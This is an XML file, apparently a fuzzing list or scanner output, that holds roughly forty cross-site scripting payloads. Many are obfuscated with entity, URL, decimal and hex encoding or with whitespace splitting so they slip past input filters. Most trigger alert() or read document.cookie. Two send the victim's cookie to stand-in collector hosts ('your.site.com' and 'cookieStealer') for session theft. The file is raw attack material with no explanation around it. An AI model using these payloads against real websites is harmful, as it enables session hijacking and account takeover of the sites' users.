<XSSResults><Payload>"&amp;gt;&amp;lt;script&amp;gt;"</Payload><Payload>\";alert('XSS');//</Payload><Payload>&amp;lt;&amp;lt;script&amp;gt;alert("WXSS");//&amp;lt;&amp;lt;/script&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=javascript:alert('WXSS')&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="javascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=JaVaScRiPt:alert('WXSS')&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="javascript:alert('WXSS')"</Payload><Payload>&amp;amp;ltscript&amp;amp;gtalert(document.cookie);&amp;amp;ltscript&amp;amp;gtalert</Payload><Payload>&amp;amp;ltscript&amp;amp;gtalert(document.cookie);&amp;lt;/script&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC='javascript:alert(document.cookie)'&amp;gt;</Payload><Payload>%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E</Payload><Payload>'&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;</Payload><Payload>%3cscript%3ealert(document.cookie);%3c%2fscript%3e</Payload><Payload>%3cscript%3ealert("WXSS");%3c/script%3e</Payload><Payload>&amp;lt;xss&amp;gt;&amp;lt;script&amp;gt;alert('WXSS')&amp;lt;/script&amp;gt;&amp;lt;/vulnerable&amp;gt;</Payload><Payload>'&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</Payload><Payload>&amp;lt;script&amp;gt;alert("WXSS")&amp;lt;/script&amp;gt;</Payload><Payload>&amp;lt;IMG%20"""&amp;gt;&amp;lt;SCRIPT&amp;gt;alert("WXSS")&amp;lt;/SCRIPT&amp;gt;"&amp;gt;</Payload><Payload>&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="jav&amp;amp;#x09;ascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=javascript:alert(&amp;amp;quot;WXSS&amp;amp;quot;)&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;</Payload><Payload>'';!--"&amp;lt;XSS&amp;gt;=&amp;amp;{()}</Payload><Payload>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//&amp;gt;&amp;lt;/SCRIPT&amp;gt;!--&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;=&amp;amp;{}</Payload><Payload>%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E</Payload><Payload>"&amp;gt;&amp;lt;script&amp;gt;document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie&amp;lt;/script&amp;gt;</Payload><Payload>'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E</Payload><Payload>&amp;lt;IMG%20SRC=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="jav	ascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'&amp;gt;</Payload><Payload>&amp;lt;IMG%20DYNSRC="javascript:alert('WXSS')"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="%20&amp;amp;#14;%20javascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="jav&amp;amp;#x0D;ascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20LOWSRC="javascript:alert('WXSS')"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=`javascript:alert("'WXSS'")`&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC="jav&amp;amp;#x0A;ascript:alert('WXSS');"&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC='javasc	ript:alert(document.cookie)'&amp;gt;</Payload><Payload>&amp;lt;IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt;</Payload></XSSResults>